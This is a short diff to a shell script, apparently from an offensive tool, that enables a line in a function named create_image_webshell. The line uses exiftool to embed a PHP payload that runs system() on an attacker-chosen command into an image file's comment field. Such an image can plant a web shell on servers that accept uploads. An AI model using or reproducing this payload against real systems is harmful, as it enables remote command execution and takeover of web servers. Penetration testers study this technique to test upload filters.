@@ -344,7 +344,7 @@ create_image_webshell() {
     else
         command="'$cmd'"
     fi
-    #exiftool -Comment="<?php system($command); ?>" "$webshell_filename"
+    exiftool -Comment="<?php system($command); ?>" "$webshell_filename"
 }
 
 create_image_gif_webshell() {
